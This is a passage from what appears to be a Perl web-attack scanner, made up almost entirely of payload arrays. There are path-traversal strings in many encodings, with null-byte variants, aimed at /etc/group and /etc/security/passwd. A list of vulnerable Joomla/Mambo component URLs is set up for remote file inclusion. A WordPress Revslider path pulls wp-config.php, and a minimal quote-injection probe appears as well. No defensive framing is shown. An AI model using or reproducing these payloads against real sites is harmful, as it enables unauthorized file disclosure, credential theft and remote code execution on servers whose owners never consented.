2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../../../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## XSS
sub XSS {@XSS = ("%27");}
############################################################################################################################################################################################
############################################################################################################################################################################################
## RFI
sub RFI {@RFI = ("/components/com_flyspray/startdown.php?file=", "/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=", "/components/com_simpleboard/file_upload.php?sbp=", "/components/com_hashcash/server.php?mosConfig_absolute_path=", "/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=", "/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=", "/components/com_performs/performs.php?mosConfig_absolute_path=", "/components/com_forum/download.php?phpbb_root_path=", "/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=", "/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=", "/components/minibb/index.php?absolute_path=", "/components/com_smf/smf.php?mosConfig_absolute_path=", "/modules/mod_calendar.php?absolute_path=", "/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=", "/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=", "/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=", "/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=", "/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=", "/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=", "/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=", "/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=", "/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=", "/components/com_securityimages/configinsert.php?mosConfig_absolute_path=", "/components/com_securityimages/lang.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/components/com_galleria/galleria.html.php?mosConfig_absolute_path=", "/akocomments.php?mosConfig_absolute_path=", "/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=", "/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=", "/components/com_zoom/includes/database.php?mosConfig_absolute_path=", "/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=", "/components/com_fm/fm.install.php?lm_absolute_path=", "/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=", "/components/com_lmo/lmo.php?mosConfig_absolute_path=", "/administrator/components/com_webring/admin.webring.docs.php?component_dir=", "/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=", "/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=", "/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=", "/components/com_mambowiki/MamboLogin.php?IP=", "/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=", "/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=", "/components/com_cpg/cpg.php?mosConfig_absolute_path=", "/components/com_moodle/moodle.php?mosConfig_absolute_path=", "/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=", "/components/com_mospray/scripts/admin.php?basedir=", "/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=", "/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=", "/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=", "/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=", "/components/com_madeira/img.php?url=", "/components/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/admin.jjgallery.php?mosConfig_absolute_path=", "/components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=", "/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=", "/index.php?option=com_custompages&cpage=", "/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/components/com_facileforms/facileforms.frame.php?ff_compath=", "/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=", "/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=", "/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=", "/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=", "/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=", "/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=", "/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=", "/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=", "/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=", "/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/components/com_reporter/reporter.logic.php?mosConfig_absolute_path=", "/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_joomlaboard/file_upload.php?sbp=", "/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=", "/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=", "/modules/mod_as_category.php?mosConfig_absolute_path=", "/components/com_articles.php?absolute_path=", "/classes/html/com_articles.php?absolute_path=", "/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=", "/templates/be2004-2/index.php?mosConfig_absolute_path=", "/libraries/pcl/pcltar.php?g_pcltar_lib_dir=", "/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=", "/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=", "/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=", "/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=", "/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=", "/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=", "/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=", "/components/com_mp3_allopass/allopass.php?mosConfig_live_site=", "/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=", "/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolte_path=", "/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_color/admin.color.php?mosConfig_live_site=", "/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=", "/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=", "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&mosConfig_absolute_path=", "/com_ponygallery/admin.ponygallery.html.php?mosConfig_absolute_path=", "/com_magazine_3_0_1/magazine.functions.php?config=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path=", "/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
#ADF WP WORDPRESS
sub ADFWP {@ADFWP =("/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
